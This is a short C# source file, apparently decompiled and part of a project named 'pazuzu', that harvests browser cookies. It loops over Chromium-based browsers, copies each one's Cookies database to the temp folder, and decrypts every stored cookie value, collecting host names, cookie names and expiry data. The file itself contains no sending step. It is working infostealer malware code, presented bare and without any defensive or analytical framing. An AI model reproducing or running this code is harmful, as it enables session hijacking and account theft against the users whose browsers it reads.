using System;
using System.Collections.Generic;
using System.IO;

namespace pazuzu.ChromiumBased;

internal class CCookies
{
	public static List<Common.CCookie> Get()
	{
		string text = "Cookies";
		List<Common.CCookie> list = new List<Common.CCookie>();
		string text2 = "";
		string[] chromiumBasedBrowsers = Paths.chromiumBasedBrowsers;
		foreach (string browser in chromiumBasedBrowsers)
		{
			string text3 = Paths.GetUserData(browser) + text;
			if (!File.Exists(text3))
			{
				continue;
			}
			text2 = Environment.GetEnvironmentVariable("temp") + "\\browserCookies";
			if (File.Exists(text2))
			{
				File.Delete(text2);
			}
			File.Copy(text3, text2);
			SQLite sQLite = new SQLite(text2);
			sQLite.ReadTable("cookies");
			for (int j = 0; j < sQLite.GetRowCount(); j++)
			{
				string value = sQLite.GetValue(j, 12);
				string value2 = sQLite.GetValue(j, 1);
				string value3 = sQLite.GetValue(j, 2);
				string value4 = sQLite.GetValue(j, 4);
				string expiresutc = Convert.ToString(TimeZoneInfo.ConvertTimeFromUtc(DateTime.FromFileTimeUtc(10L * Convert.ToInt64(sQLite.GetValue(j, 5))), TimeZoneInfo.Local));
				string issecure = sQLite.GetValue(j, 6).ToUpper();
				if (string.IsNullOrEmpty(value3))
				{
					break;
				}
				Common.CCookie item = default(Common.CCookie);
				item.value = Crypt.GetUTF8(Crypt.decryptChrome(value, text3));
				item.hostname = value2;
				item.name = Crypt.GetUTF8(value3);
				item.path = value4;
				item.expiresutc = expiresutc;
				item.issecure = issecure;
				list.Add(item);
			}
		}
		return list;
	}
}
